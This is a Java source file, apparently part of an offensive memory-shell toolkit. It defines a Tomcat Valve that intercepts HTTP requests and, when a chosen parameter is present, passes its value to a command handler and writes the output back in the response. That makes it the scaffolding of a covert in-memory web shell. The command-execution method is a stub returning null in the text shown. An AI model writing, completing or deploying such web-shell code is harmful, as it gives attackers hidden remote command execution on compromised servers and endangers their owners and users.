package com.reajason.javaweb.memshell.shelltool.command;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 */
public class CommandValve implements Valve {
    private static String paramName;

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            String param = getParam(request.getParameter(paramName));
            if (param != null) {
                InputStream inputStream = getInputStream(param);
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        this.getNext().invoke(request, response);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String cmd) throws Exception {
        return null;
    }

    protected Valve next;
    protected boolean asyncSupported;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }
}